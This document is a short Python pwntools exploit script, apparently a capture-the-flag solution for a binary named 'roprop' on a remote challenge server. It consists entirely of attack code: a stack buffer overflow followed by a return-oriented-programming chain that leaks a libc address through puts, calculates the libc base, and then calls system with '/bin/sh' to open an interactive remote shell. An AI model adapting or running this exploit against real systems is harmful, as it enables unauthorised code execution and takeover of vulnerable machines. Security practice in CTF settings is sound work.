from pwn import *
b=ELF("./roprop")
r=remote("pwn.darkarmy.xyz",5002)
#r=process("./roprop")
context.log_level='debug'
prdi=0x400963
ret=0x400646
pay=b''
pay+=b'x'*0x50
pay+=b'x'*8
pay+=p64(prdi)
pay+=p64(b.got['gets'])
pay+=p64(b.plt['puts'])
pay+=p64(b.symbols['main'])

r.sendline(pay)
temp=r.recvuntil("\x7f")
temp=temp[::-1]
temp=b'\x00\x00'+temp[:6]
temp=int.from_bytes(temp,byteorder='big',signed=False)
libcbase=temp-0x80120
system=libcbase+0x4f4e0
binsh= libcbase+0x1b40fa
print(hex(libcbase))
pay2=b'x'*0x58
pay2+=p64(prdi)
pay2+=p64(binsh)
pay2+=p64(ret)
pay2+=p64(system)
pause()
r.sendline(pay2)
r.interactive()
